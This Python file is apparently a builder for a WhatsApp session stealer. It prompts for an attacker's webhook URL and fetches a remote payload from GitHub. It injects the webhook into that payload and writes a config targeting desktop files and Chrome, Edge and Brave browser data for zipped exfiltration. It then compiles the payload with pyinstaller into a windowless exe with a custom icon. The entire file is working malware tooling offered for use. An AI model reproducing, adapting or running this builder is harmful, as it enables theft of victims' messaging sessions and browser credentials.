from colorama import Fore
import os
import time
import json
import requests

from pystyle import Colors, Colorate, Write, Center, Box

os.system('cls')
try:
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW("WhatsApp Session Mastering | Testing")
except Exception:
    pass

banner = """ 
        ╦ ╦╔═╗       
        ║║║╠═╣       
        ╚╩╝╩ ╩       
"""

PAYLOAD_URL = "https://raw.githubusercontent.com/rinsfx/WhatsappMaster/master/payload.py"
PLACEHOLDER = 'WEBHOOK = "Rins on top"'


def _exit():
    print("\n")
    Write.Print("    .$ Exiting program | Please star the repo my g",
                Colors.yellow_to_red, interval=0.05)
    time.sleep(3)
    quit()


def _compile():
    print("\n")
    line = ("pyinstaller --onefile --noconsole "
            "--hidden-import=dhooks --hidden-import=pystyle "
            "--hidden-import=requests_toolbelt "
            "--collect-all=dhooks --collect-all=requests_toolbelt "
            "whatsapp.pyw")
    icox = Write.Input("    .$ Enter icon path (type N for none) -> ",
                       Colors.green_to_blue, interval=0.025)
    if icox.strip().upper() != "N" and icox.strip():
        line += f" --icon={icox.strip()}"

    Write.Print("    .$ Compiling to exe ...", Colors.green_to_yellow, interval=0.05)
    os.system("echo off")
    print(Fore.BLACK)
    os.system(line)
    print(Colorate.Horizontal(Colors.rainbow, "    .$ Successfully Compiled", 1))
    _exit()


def _build_config(webhook_url):
    cfg = {
        "webhook": webhook_url,
        "targets": ["desktop", "chrome"],
        "chrome_browsers": ["chrome", "edge", "brave"],
        "max_zip_mb": 200,
        "retries": 10,
        "retry_delay_sec": 2
    }
    with open("config.json", "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2)


def main():
    os.system("cls")
    print("\n")
    print(Colorate.Horizontal(Colors.green_to_blue, Center.XCenter(banner), 1))
    print(Colorate.Horizontal(Colors.green_to_blue, Box.Lines("made by RinsTest")))
    print("\n")

    wbh_url = Write.Input("    .$ Enter your WebHook url -> ",
                          Colors.green_to_blue, interval=0.025).strip()
    if not wbh_url:
        _exit()

    Write.Print("    .$ Fetching payload ...", Colors.green_to_yellow, interval=0.05)
    try:
        payload = requests.get(PAYLOAD_URL, timeout=15).text
    except Exception as e:
        Write.Print(f"\n    .$ Fetch failed: {e}", Colors.red_to_yellow, interval=0.05)
        _exit()

    if PLACEHOLDER not in payload:
        Write.Print("\n    .$ Placeholder not found in payload — aborting.",
                    Colors.red_to_yellow, interval=0.05)
        _exit()

    with open("whatsapp.pyw", "w", encoding="utf-8") as f:
        f.write(payload.replace(PLACEHOLDER, f'WEBHOOK = "{wbh_url}"'))

    _build_config(wbh_url)

    Write.Print("\n    .$ Payload fetched + config written !",
                Colors.green_to_cyan, interval=0.05)

    compiling = Write.Input("\n    .$ Compile to exe [Y/N] -> ",
                            Colors.green_to_blue, interval=0.025).strip().upper()
    if compiling == "Y":
        _compile()
    else:
        _exit()


if __name__ == "__main__":
    main()
